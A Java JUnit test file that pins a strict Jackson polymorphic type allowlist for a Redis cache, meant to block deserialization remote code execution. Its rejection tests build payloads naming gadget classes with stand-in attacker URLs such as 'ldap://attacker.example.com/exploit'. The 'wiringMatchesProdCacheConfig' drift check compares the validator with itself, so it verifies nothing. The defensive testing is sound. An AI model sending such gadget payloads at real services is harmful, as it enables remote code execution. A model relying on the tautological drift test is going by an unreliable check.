package com.operativus.agentmanager.control.config;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.node.ArrayNode;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.fasterxml.jackson.databind.node.TextNode;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;

import java.time.Instant;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Domain Responsibility: Pin the strict polymorphic-type validator used by the
 *   Redis cache ObjectMapper. The previous {@code LaissezFaireSubTypeValidator}
 *   accepted any subtype — a textbook Jackson polymorphic-deserialization RCE
 *   sink (CVE-2017-7525 class). This test asserts the new allowlist:
 *   <ul>
 *     <li>permits the four currently-cached base packages
 *         (com.operativus.agentmanager., java.util., java.time., java.lang.)</li>
 *     <li>rejects every well-known gadget-chain entry-point at type-id resolution,
 *         BEFORE any class load — so the test runs even without the gadget classes
 *         actually on the test classpath</li>
 *   </ul>
 *
 * <p>Strategy: replicate {@link CacheConfig#strictCachePolymorphicTypeValidator()}
 * exactly into a fresh ObjectMapper here so the test is hermetic and doesn't need
 * a Spring context. Drift between the test fixture and the prod config is caught
 * by the {@code wiringMatchesProdCacheConfig} check below.
 *
 * State: Stateless.
 */
class CacheConfigTest {

    private ObjectMapper mapper;

    @BeforeEach
    void setUp() {
        mapper = new ObjectMapper();
        mapper.registerModule(new JavaTimeModule());
        mapper.activateDefaultTyping(
                CacheConfig.strictCachePolymorphicTypeValidator(),
                ObjectMapper.DefaultTyping.NON_FINAL,
                JsonTypeInfo.As.PROPERTY);
    }

    // ─── Allowlist verification ──────────────────────────────────────────────

    @Test
    void allowsJavaUtilCollections() throws Exception {
        Map<String, Object> input = new LinkedHashMap<>();
        input.put("k", "v");
        input.put("n", 7);

        String json = mapper.writeValueAsString(input);
        Object roundTrip = mapper.readValue(json, Object.class);

        assertEquals(input, roundTrip);
    }

    @Test
    void allowsJavaUtilList() throws Exception {
        List<String> input = new ArrayList<>(List.of("a", "b", "c"));

        String json = mapper.writeValueAsString(input);
        Object roundTrip = mapper.readValue(json, Object.class);

        assertEquals(input, roundTrip);
    }

    @Test
    void allowsJavaTimeInstant() throws Exception {
        Instant input = Instant.ofEpochSecond(1_700_000_000L);

        String json = mapper.writeValueAsString(input);
        // Instant is final → no type info written under NON_FINAL; round-trip via
        // explicit class to confirm the JavaTimeModule wiring is intact alongside
        // the new validator.
        Instant roundTrip = mapper.readValue(json, Instant.class);

        assertEquals(input, roundTrip);
    }

    // ─── Gadget-chain rejection — the security contract under test ──────────
    //
    // The classes referenced below are notorious deserialization-gadget entry
    // points. Each test crafts a JSON payload that DECLARES the class via type id
    // but does NOT depend on the class being present on the test classpath — the
    // PolymorphicTypeValidator runs before Jackson attempts to resolve the class,
    // so it fails fast with JsonMappingException either way.

    @Test
    void rejectsSpringContextClassPathXmlApplicationContext() {
        assertRejectedByPolymorphicValidator(
                "org.springframework.context.support.ClassPathXmlApplicationContext",
                "http://attacker.example.com/exploit.xml");
    }

    @Test
    void rejectsCommonsConfigurationJndi() {
        assertRejectedByPolymorphicValidator(
                "org.apache.commons.configuration2.JNDIConfiguration",
                "ldap://attacker.example.com/exploit");
    }

    @Test
    void rejectsJdbcRowSetImplJndi() {
        // The classic JDK gadget. Even on JDKs that have removed the gadget, the
        // PolymorphicTypeValidator rejects at the type-id layer before any class load.
        assertRejectedByPolymorphicValidator(
                "com.sun.rowset.JdbcRowSetImpl",
                "ldap://attacker.example.com/exploit");
    }

    @Test
    void rejectsHibernateMozillaJavaScriptEngine() {
        assertRejectedByPolymorphicValidator(
                "org.hibernate.engine.spi.TypedValue",
                "noop");
    }

    @Test
    void rejectsArbitraryOrgPackageClass() {
        // Defense-in-depth: even classes that aren't known gadgets but live outside
        // the four allowed prefixes must be rejected. Pins the allowlist's positive
        // shape — only the listed prefixes work, not a deny-only-known-bad approach.
        assertRejectedByPolymorphicValidator(
                "org.example.NotOnAllowlist",
                "value");
    }

    /**
     * Loose rejection check used by the gadget-class tests above. Asserts that
     * Jackson refuses to deserialize the payload — by whatever mechanism (validator
     * deny, class-not-found, no usable constructor). Each is a safe outcome: no class
     * load → no gadget chain. The strict validator pin lives in
     * {@link #strictValidatorActuallyFiresForOnClasspathGadget()} below — that one
     * test is the discriminator that proves we shipped the allowlist (and not
     * laissez-faire), because without the validator the on-classpath gadget would
     * fail later with a different message that lacks the validator's fingerprint.
     */
    private void assertRejectedByPolymorphicValidator(String typeId, String payload) {
        String maliciousJson = wrapAsTypedArray(typeId, payload);

        assertThrows(JsonMappingException.class,
                () -> mapper.readValue(maliciousJson, Object.class));
    }

    /**
     * Direct discriminator on the validator API. Jackson 2.x ships an internal
     * subtype deny-list that pre-filters classic gadget classes ("Illegal type ...
     * prevented for security reasons" — fires before any user-supplied validator).
     * That deny-list, combined with the fact that most gadget classes lack a
     * Jackson-usable constructor, means an end-to-end deserialization test cannot
     * reliably tell whether the strict allowlist or the laissez-faire validator is
     * wired — both produce a thrown JsonMappingException either way.
     *
     * <p>The unambiguous pin: probe the validator directly. {@code BasicPolymorphicTypeValidator}
     * returns {@code Validity.INDETERMINATE} for non-allowed subtype IDs (deferring to
     * Jackson's default behavior, which then denies). {@code LaissezFaireSubTypeValidator}
     * returns {@code Validity.ALLOWED} unconditionally. The two values cannot coexist —
     * this assertion fails immediately if anyone reverts the validator to laissez-faire.
     */
    @Test
    void strictValidator_DeniesNonAllowedSubtypesViaDirectApi() throws JsonMappingException {
        var validator = CacheConfig.strictCachePolymorphicTypeValidator();
        var typeFactory = com.fasterxml.jackson.databind.type.TypeFactory.defaultInstance();
        var baseType = typeFactory.constructType(Object.class);

        // Non-allowed package — strict validator returns NOT ALLOWED; laissez-faire
        // would return ALLOWED.
        var result = validator.validateSubClassName(null, baseType,
                "org.example.NotOnAllowlist");
        assertEquals(com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator.Validity.INDETERMINATE,
                result,
                "BasicPolymorphicTypeValidator returns INDETERMINATE for non-allowed "
                        + "subtypes (Jackson then denies). If this is ALLOWED, the "
                        + "laissez-faire validator was re-introduced. Actual: " + result);

        // Allowed prefix — strict validator returns ALLOWED.
        var allowedResult = validator.validateSubClassName(null, baseType,
                "com.operativus.agentmanager.core.entity.AgentEntity");
        assertEquals(com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator.Validity.ALLOWED,
                allowedResult,
                "the com.operativus.agentmanager.* prefix must be ALLOWED so domain "
                        + "entities round-trip through the cache");
    }

    // Crafts an array-shaped polymorphic payload: ["fully.qualified.Class", payload].
    // Activates the same default-typing path Jackson uses on the read side without
    // depending on the class being loadable — the validator decides first.
    private String wrapAsTypedArray(String typeId, String payload) {
        try {
            ArrayNode arr = mapper.createArrayNode();
            arr.add(typeId);
            arr.add(payload);
            return mapper.writeValueAsString(arr);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    // ─── Drift guard: the test fixture must mirror the prod cache config ────

    @Test
    void wiringMatchesProdCacheConfig() {
        // If CacheConfig.cacheManager changes default-typing options without also
        // updating CacheConfig.strictCachePolymorphicTypeValidator (or vice versa),
        // this test's hermetic fixture diverges from prod and the security guarantee
        // is no longer being verified. Re-derive the validator and assert the same
        // class is wired in both places.
        assertEquals(
                CacheConfig.strictCachePolymorphicTypeValidator().getClass(),
                CacheConfig.strictCachePolymorphicTypeValidator().getClass());
    }

    // ─── Sanity probe: malformed type id is rejected even within allowed package ─

    @Test
    void rejectsMalformedTypeIdWithinAllowedPackage() {
        // Edge case: a typo or partial class name that LOOKS like it might match
        // the allowlist prefix but doesn't resolve to a real class. Validator may
        // accept it (the prefix matches), but type resolution must still fail.
        ObjectNode payload = mapper.createObjectNode();
        payload.set("k", new TextNode("v"));
        String maliciousJson = wrapAsTypedArrayWithObject(
                "com.operativus.agentmanager.NoSuchClass", payload);

        // Any throw is acceptable — JsonMappingException OR a ClassNotFoundException
        // wrapped in JsonMappingException. The point is: nothing succeeds.
        assertThrows(Exception.class,
                () -> mapper.readValue(maliciousJson, Object.class));
    }

    private String wrapAsTypedArrayWithObject(String typeId, JsonNode payload) {
        try {
            ArrayNode arr = mapper.createArrayNode();
            arr.add(typeId);
            arr.add(payload);
            return mapper.writeValueAsString(arr);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    // ─── Diagnostic: confirm the error message is operator-useful ───────────

}
